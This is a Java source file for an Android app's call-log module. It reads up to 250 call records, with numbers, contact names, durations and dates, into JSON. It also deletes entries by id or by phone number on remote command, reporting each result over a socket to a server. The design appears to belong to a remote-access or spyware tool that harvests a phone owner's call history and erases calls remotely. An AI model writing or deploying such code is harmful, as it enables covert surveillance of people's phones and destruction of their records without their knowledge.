package com.fason.app.features.calls;

import android.Manifest;
import android.content.ContentUris;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;
import org.json.JSONArray;
import org.json.JSONObject;
import io.socket.client.Socket;

public final class CallsManager {
    private static final int MAX = 250;

    private CallsManager() {}

    // ── read ─────────────────────────────────────────────────────────────────

    public static JSONObject getLogs() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();
        try {
            result.put(Protocol.KEY_CALLS_LIST, list);
            if (!PermissionManager.canIUse(Manifest.permission.READ_CALL_LOG)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }
            Cursor cur = FasonApp.getContext().getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC");
            if (cur != null) {
                try {
                    // v4.0: include _id so the frontend can reference entries for deletion
                    int idIdx   = cur.getColumnIndex(CallLog.Calls._ID);
                    int numIdx  = cur.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int durIdx  = cur.getColumnIndex(CallLog.Calls.DURATION);
                    int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);
                    int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
                    int count = 0;
                    while (cur.moveToNext() && count < MAX) {
                        JSONObject call = new JSONObject();
                        call.put(Protocol.KEY_CALL_ID, idIdx >= 0 ? cur.getLong(idIdx) : -1);
                        call.put(Protocol.KEY_PHONE_NO, numIdx >= 0 ? cur.getString(numIdx) : "");
                        call.put(Protocol.KEY_NAME,     nameIdx >= 0 ? cur.getString(nameIdx) : "");
                        call.put(Protocol.KEY_DURATION, durIdx >= 0 ? cur.getString(durIdx) : "");
                        call.put(Protocol.KEY_DATE,     dateIdx >= 0 ? cur.getString(dateIdx) : "");
                        call.put(Protocol.KEY_TYPE,     typeIdx >= 0 ? cur.getInt(typeIdx) : -1);
                        list.put(call);
                        count++;
                    }
                } finally {
                    cur.close();
                }
            }
            result.put(Protocol.KEY_TOTAL, list.length());
        } catch (Exception e) {
            try { result.put(Protocol.KEY_ERROR, "Failed: " + e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // ── delete ────────────────────────────────────────────────────────────────

    /**
     * Delete a single call log entry by its _id.
     */
    public static void deleteCallLog(long callId, String cmdId) {
        try {
            if (!PermissionManager.canIUse(Manifest.permission.WRITE_CALL_LOG)) {
                sendResult(false, "WRITE_CALL_LOG denied", cmdId);
                return;
            }
            Uri deleteUri = ContentUris.withAppendedId(CallLog.Calls.CONTENT_URI, callId);
            int rows = FasonApp.getContext().getContentResolver().delete(deleteUri, null, null);
            sendResult(rows > 0, rows > 0 ? null : "Entry not found (id=" + callId + ")", cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    /**
     * Delete ALL call log entries for a specific phone number.
     */
    public static void deleteCallLogByNumber(String number, String cmdId) {
        try {
            if (!PermissionManager.canIUse(Manifest.permission.WRITE_CALL_LOG)) {
                sendResult(false, "WRITE_CALL_LOG denied", cmdId);
                return;
            }
            int rows = FasonApp.getContext().getContentResolver().delete(
                CallLog.Calls.CONTENT_URI,
                CallLog.Calls.NUMBER + " = ?",
                new String[]{number}
            );
            sendResult(true, "deleted " + rows + " entries", cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private static void sendResult(boolean success, String detail, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, "call_action_result");
            r.put(Protocol.KEY_SUCCESS, success);
            if (detail != null) r.put(success ? Protocol.KEY_MESSAGE : Protocol.KEY_ERROR, detail);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.CALLS, r);
        } catch (Exception ignored) {}
    }
}
